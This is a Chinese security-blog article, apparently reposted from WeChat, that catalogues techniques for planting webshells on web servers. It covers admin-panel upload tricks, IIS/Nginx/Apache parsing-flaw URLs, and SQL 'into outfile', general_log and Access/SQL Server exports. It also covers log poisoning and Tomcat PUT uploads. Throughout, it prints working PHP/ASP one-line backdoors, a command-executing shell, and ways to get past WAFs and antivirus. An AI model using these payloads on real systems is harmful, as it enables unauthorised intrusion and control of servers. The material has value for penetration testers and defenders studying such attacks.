<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QtEbtZMNxcvNeJ8gpLJ6bg)

免责声明：

本公众号发布的文章均转载自互联网或经作者投稿授权的原创，

文中已注明出处，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！ 

**欢迎各位添加微信号: hackingheibaihong**

 **关注公众号，加入星球 + 交流群 一起交流、学习安全技术**

  

  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz/8fbA6bMTCeLib6GuYQxv8LSEXPH5a3uF9UlLAKgbIkAtGx36Guwk2AKhKIrwZc3pnOAoS5W1HyribvH1ib8BRG0jw/640?wx_fmt=png)

  

Getshell 分为进管理员后台 Getshell 和不进后台 Getshell，本文主要总结常见进后台 Getshell 和部分。

  

![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjt1xEbpjPL5Z6GcVyqR5OzonhxsHl3iaZibQZuGjjfzutbKsfZ9vxH25swF1tPsYVV60anTSA965yQ/640?wx_fmt=png)

**进后台 Getshell**

01

**管理员后台直接 Getshell**

管理员后台直接上传 Getshell，有时候带密码的 Webshell 连接时容易被 waf 拦截，可以上传不加密的 Webshell 如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../ 来穿越目录，如上传的文件为 a.php，将 a.php 修改为../a.php。

02

**后台数据库备份 Getshell**

后台数据库备份 getshell，上传图片马并获取图片马路径，通过数据库备份修改后缀名，如有后缀名无法修改或路径无法修改限制可修改前端代码绕过，当所备份的数据库来源无法修改时，我们可以通过首先将一句话木马写入数据库，比如通过新建管理员用户，将用户名用一句话木马代替（用户名通常有长度限制，在前端修改 maxlength 即可），<%eval request ("pass")%>

然后再通过备份数据库后访问此界面 Getshell。

**各类上传 Getshell**

04

**修改网站上传类型 Getshell**

修改网站上传类型，后台设置中添加 aasps|asp|php|jsp|aspx|asa|cer，保存后上传 aasps 文件，上传后为 asp 文件可以解析 Getshll。

05

**上传其他脚本类型 Getshell**

一台服务器有多个站，如 a 网站为 asp 脚本，b 网站为 php 脚本，而 a 中限制了上传文件类型为 asp 的文件，此时可以上传 php 的脚本，来拿 shell；也可以尝试脚本文件后缀名改为 asa 或者在后面直接加个. 如 xx.asp. 来突破文件类型限制进行上传来 Getshell

**解析漏洞 Getshell**

01

**IIS6.0 解析漏洞**

`http://www.xxx.com/xx.asp/xx.jpg`

`http://www.xxx.com/xx.asp/xx.txt`

`http://www.xxx.com/xx.asp/xx.asp;jpg`

02

**IIS7.0/7.5、Nginx<8.0 解析漏洞**

`http://www.xxx.com/xx.jpg/.php`

03

**Nginx<8.03 空字节代码执行漏洞**

版本范围：Nginx0.5.,0.6., 0.7 <= 0.7.65, 0.8 <= 0.8.37

`http://www.xxx.com/xx.jpg%00.php`

04

**Apache 解析漏洞**

`http://www.xxx.com/xx.php.owf.rar`逆向解析，直到能解析出 php 为止

05

**CVE-2013-4547 Nginx 解析漏洞**

`http://www.xxx.com/xx.jpg（非编码空格）\0.php`

**编辑器漏洞 Getshell**

01

**网站配置插马 Getshell**

进入后台后，网站配置插马 getshell，可以找到源码本地搭建，插入时注意与源码闭合，如果插入出错可能导致网站报废。如 asp 中单引号表示单行注释作用

`%><%eval request("v01cano")%><%`

02

**编辑器模版 Getshell**

通过网站的模版编写一句话，然后生成脚本文件 getshell 通过将木马添加到压缩文件，把名字改为网站的模版类型，上传到服务器，getshell）（新建或修改目录名为 xx.asp/ 此目录下的 jsp，html 会以 asp 执行，配置 iis6. 有 0 解析漏洞 。

03

**修改脚本文件 Getshell**

修改后台脚本文件插入一句话直接 Getshell，尽量插在头和尾 。

04

**上传插件、更新页面 Getshell**

进入 wordpress，dz 等，如编辑 wordpress404 页面插入一句话，可以先下载对应版本找到 404 路径，部分 OA 上传插件 Getshell， jboss，tomcat 上传 war 包 getshell 等。

05

**执行 sql 语句写入 Webshell**

首先执行错误的 sql 语句，使其暴露出网站的根目录，以 ecshop 为例，进入后台执行 sql 查询

`select "<?php phpinfo();?>" into outfile "C:\\vulcms\\ecshopv3.6\\ecshop\\v01cano.php";`

关于此语句说明，在 windows 中有时候需要使用斜杠 / 有时候需要使用双反斜杠 \ 末尾有时候需要分号，有时候也不需要分号。也可以先将一句话通过 ecshop 的新建管理员写入到 user 表中，然后通过数据库备份配合解析漏洞 Getshell。  

**命令执行 Getshell**

01

**Windows**

```
链接：https://zhuanlan.zhihu.com/p/346775340
```

02

**Linux**

```
echo -e "<?php @assert(\$_POST[C0cho])?>" > 1.php
```

Linux 需要在 $ 前加 \ 进行防转义，Windows 需要在 < 前加 ^ 防转义，Windows 和 Linux 中的 “可以使用’或不使用进行尝试

**文件包含 Getshell**

01

**asp 包含**

`include file="123.jpg"`调用的文件必须和被调用的文件在同一目录，否则找不到，如果不在同一目录，用下面语句也使用如下代码`include virtual="文件所在目录/123.jpg"`

02

**php 包含**

```
<?php
include('123.jpg');
?>
```

03

**使用 php://input**

使用 burpsuite 截取数据包，并修改内容转发 (还可以使用 hackbar 工具中的 post data 中输入`<?php fputs(fopen("shell1.php","w"),'1111<?php @assert($_POST[xss])?>2222')?>等一句话木马)`

截取 get 请求

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RS0PibPgXWibAWyRD6gXRxFibzicMjmG2B1TqER52WrkqS6ibocd3Em0t0EjA/640?wx_fmt=png)

将一句话木马

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RScgn6kqdOL1edFUTlmWIZYdur3aZjpxbGC0mcukGZibQM0KaaEm7Vmiaw/640?wx_fmt=png)

访问浏览器查看是否成功

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RSOEooT9ib9F9euibTLwkwCSvNFXjHqKohG8rSJGEAGPcFw0QLDLdZfgsw/640?wx_fmt=png)

**数据库命令执行 Getshell**

01

**Access 导出**

Access 可导出 xxx 等文件需要配合解析漏洞。

```
create table cmd (a varchar(50));
insert into cmd (a) values ('一句话木马')   #一句话木马如：<%execute request(1)%>
select * into [a] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;' from cmd 
drop table cmd
```

菜刀直连`https://www.webshell.cc/1.asa;x.xls`

02

**Sqlserver 导出**

```
exec sp_makewebtask 'C:\test1.php','select "<%eval request("pass")%>" 
```

03

**Mysql 导出**

以 phpMyAdmin 为例:

**方法一**

```
create TABLE xiaoma (xiaoma1 text NOT NULL);
insert INTO xiaoma (xiaoma1) VALUES('<?php eval($_POST[xiaoma]);?>');
select xiaoma1 from xiaoma into outfile 'D:/phpstudy/www/7.php';
drop TABLE IF EXISTS xiaoma;
```

**方法二**

```
select "<?php eval($_POST[v01cano]);?>" into outfile 'D:/phpstudy/www/a.php'
```

**方法三**

当数据库路径未知时 Getshell

```
//创建表a,并且将httpd.conf写入到表a中
create table a(a text);load data infile "C:/phpStudy/Apache/conf/httpd.conf" into table a;
```

然后执行导出操作，将该文件下载，使用 notepad++ 打开，最后搜索 documentroot，即可找到网站的根目录：

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RSj9Sl4UTvwsFLic7AvV2R4WQFqIV29AxJP330kTqxWPL2TbmcdomBdKg/640?wx_fmt=png)

文件可能存在的一些路径：

```
# Windows
c:\windows\php.ini                             # php配置文件
c:\windows\system32\inetsrv\MetaBase.xml       # IIS虚拟主机配置文件
 # Linux
/etc/php.ini                                   # php配置文件
/etc/httpd/conf.d/php.conf
/etc/httpd/conf/httpd.conf                     # Apache配置文件
/usr/local/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/mysql
/user/local/httpd/conf/httpd.conf
/usr/local/apache/conf/extra/httpd-vhosts.conf # 虚拟目录配置文件
/user/local/nginx/conf/httpd.conf              # Nginx配置文件
```

**方法四**

通过 load_file 函数直接加载该文件内容

```
select load_file('C:/phpStudy/Apache/conf/httpd.conf');
```

同时需要做如下配置  

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RSic4fVxF3UaSZqeGwKeELKXUWvZiahkaeIc1uIGmXOsmScOsJkp117iafg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCia7JWiaTgFSegefKvGvO18RSuYbBU7WjbfJMCxczQE6S1a3rTdBR17ZCAB0qjpa1EuiatHKmsMeCdBg/640?wx_fmt=png)

**方法五**

general_log_file 方法获取 Webshell，show global variables like 'secure%'显示 secure_file_priv 的值为 NULL，不能利用写 into outfile 写木马 getshell。

```
show global variables like "%genera%";  #查看genera文件配置情况
set global general_log = off;   #关闭general_log  
set global general_log = 'on';  #如果general_log关闭需要开启
set global general_log_file = 'D:/www/web/shell.php'
```

**方法六**

可执行命令方式

`select '<?php echo \'<pre>\'; system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'd:/www/shell.php'`

使用方法

```
www.xxx.com/shell.php?cmd=ipconfig  #cmd=后面加命令
```

**方法七**

过杀毒软件方式，上传图片马 c.jpg，图片马内容如下：

`www.xxx.com/shell.php?cmd=ipconfig #cmd=后面加命令`

导出 Webshell

`select '<?php include 'c.jpg'?>' INTO OUTFILE 'D:/work/www/shell.php'`

**方法八**

直接导出加密 Webshell

`select unhex('加密代码') into dumpfile 'D:/www/web/shell.php'`

**不进后台 Getshell**

01

**0day Getshell**

各类 OA，coremail，cms，php 框架，数据库，java 框架等 0day，1day，nday Getshell 。

02

**写入日志 Getshell**

获取日志路径，在访问过程中在 url 或者其他位置写入`<?php eval($_POST[c]);?>;`等信息，使其日志记录此代码，然后访问日志路径，菜刀连接 Getshell，如 phpinfo(); 中能查看到 error.log 和 access.log 的路径。

03

**IIS/Tomcat 写权限 Getshell**

IIS6.0，put 协议上传手工或工具，批量扫描工具：iis put scaner，写权限利用：桂林老兵

Tomcat put 上传 CVE-2017-12615 工具传送门：https://link.zhihu.com/?target=https%3A//github.com/iBearcat/CVE-2017-12615

04

**上传会员头像 Getshell**

将 Webshell 放入文件夹，然后压缩成 zip 文件。上传正常头像抓包将图片文件内容删除，burp 右键选择文件黏贴功能，将 zip 包内容复制到 burp 中的图片内容，放行后菜刀连接图片上传路径下的文件夹（zip 压缩包名）下的 Webshell 。

05

**远程命令执行**

参考 Linux/Windows 反弹 shell，脚本语言、powershell 反弹 shell，Kali/Cobalt Strike 等各种上线方法 。

06

**其他漏洞 Getshell**

XXE，SSRF，反序列化，strust2 等一种或多种组合利用 Getshell 。

```
链接：https://zhuanlan.zhihu.com/p/346775340
```

公众号